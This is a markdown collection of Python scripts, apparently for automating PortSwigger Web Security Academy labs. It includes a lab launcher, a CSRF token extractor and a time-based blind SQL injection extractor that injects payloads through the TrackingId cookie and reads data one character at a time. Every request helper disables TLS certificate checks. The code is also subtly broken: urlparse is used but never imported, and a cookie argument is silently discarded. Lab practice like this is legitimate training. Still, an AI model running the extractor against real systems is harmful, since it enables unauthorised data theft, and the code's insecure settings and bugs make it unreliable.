# Hunter Automation Scripts

## PortSwigger Lab Launcher
```python
"""Launch and track PortSwigger lab instances."""
import http.client
import ssl
import re

def launch_lab(lab_url, cookie):
    """Launch a PortSwigger lab and return instance URL."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    parsed = urlparse(lab_url)
    conn = http.client.HTTPSConnection(parsed.hostname, context=ctx, timeout=15)
    conn.request('GET', parsed.path, headers={'Cookie': cookie})
    resp = conn.getresponse()
    html = resp.read().decode()
    resp.close()
    
    # Find lab instance URL
    match = re.search(r'https://([a-z0-9]+)\.web-security-academy\.net', html)
    return match.group(0) if match else None

def check_solved(lab_host, cookie):
    """Check if a lab is solved."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    conn = http.client.HTTPSConnection(lab_host, context=ctx, timeout=10)
    conn.request('GET', '/', headers={'Cookie': cookie})
    resp = conn.getresponse()
    html = resp.read().decode()
    resp.close()
    
    return 'is-solved' in html
```

## CSRF Token Extractor
```python
"""Extract CSRF tokens from HTML forms."""
import re

def extract_csrf(html):
    """Extract CSRF token from HTML form."""
    match = re.search(r'name="csrf"[^>]*value="([^"]+)"', html)
    return match.group(1) if match else None

def extract_all_tokens(html):
    """Extract all hidden form tokens."""
    tokens = {}
    for match in re.finditer(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]+)"', html):
        tokens[match.group(1)] = match.group(2)
    return tokens
```

## Blind SQLi Extractor
```python
"""Extract data from blind SQL injection."""
import http.client
import ssl
import time

def extract_char(host, cookie, position, charset, condition_template):
    """Extract one character from blind SQLi."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    for char in charset:
        payload = condition_template.format(pos=position, char=char)
        conn = http.client.HTTPSConnection(host, context=ctx, timeout=15)
        conn.request('GET', '/filter?category=Gifts', 
            headers={'Cookie': f'TrackingId={payload}'})
        start = time.time()
        resp = conn.getresponse()
        elapsed = time.time() - start
        resp.read()
        resp.close()
        
        if elapsed > 4:  # Time-based detection
            return char
    return None

def extract_string(host, cookie, length, charset, condition_template):
    """Extract full string from blind SQLi."""
    result = []
    for i in range(1, length + 1):
        char = extract_char(host, cookie, i, charset, condition_template)
        if char:
            result.append(char)
            print(f'Position {i}: {char}')
        else:
            break
    return ''.join(result)
```
